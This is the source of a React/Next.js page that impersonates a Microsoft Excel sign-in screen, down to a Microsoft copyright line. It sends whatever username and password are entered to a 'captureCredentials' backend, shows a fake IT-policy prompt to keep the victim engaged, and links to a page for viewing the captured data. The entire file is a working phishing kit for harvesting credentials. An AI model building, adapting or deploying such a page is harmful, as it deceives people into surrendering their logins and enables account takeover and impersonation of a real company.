'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import Link from 'next/link';

// Make Swal available in the component
declare const Swal: any;

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();

    // Capture credentials on the backend
    await captureCredentials({ username, password });

    // Show SweetAlert2 prompt
    Swal.fire({
      title: "Action Required: Employee Asset Details",
      text: "Please review and update your asset information in accordance with the new IT policy.",
      icon: "info",
      confirmButtonText: "Update Now",
      confirmButtonColor: "#3085d6",
      background: "#fff",
      color: "#333"
    }).then(() => {
      console.log("Alert closed. Would redirect to employee-asset-update.html");
    });
  };

  return (
    <>
      {/* Login Overlay */}
      <div
        className="login-overlay"
        role="main"
        aria-label="Excel Login Screen"
        style={{
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          backgroundColor: 'transparent',
          backdropFilter: 'none',
        }}
      >
        <h2 style={{ marginBottom: '20px', color: '#217346' }}>Sign in to Excel</h2>

        <form
          onSubmit={handleSubmit}
          style={{
            display: 'flex',
            flexDirection: 'column',
            background: '#fff',
            padding: '30px',
            borderRadius: '12px',
            boxShadow: '0 4px 20px rgba(0,0,0,0.2)',
            width: '300px',
          }}
        >
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            autoComplete="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
            style={{
              marginBottom: '10px',
              padding: '10px',
              borderRadius: '6px',
              border: '1px solid #ccc',
            }}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            style={{
              marginBottom: '15px',
              padding: '10px',
              borderRadius: '6px',
              border: '1px solid #ccc',
            }}
          />
          <button
            type="submit"
            style={{
              backgroundColor: '#217346',
              color: '#fff',
              border: 'none',
              borderRadius: '6px',
              padding: '10px',
              cursor: 'pointer',
              fontWeight: 'bold',
            }}
          >
            Sign in
          </button>
          <small style={{ marginTop: '10px', textAlign: 'center', color: '#888' }}>
            © Microsoft Corporation
          </small>
        </form>

        <div style={{ marginTop: '20px' }}>
          <Link href="/data" style={{ color: '#217346', textDecoration: 'none' }}>
            View Captured Data
          </Link>
        </div>
      </div>
    </>
  );
}
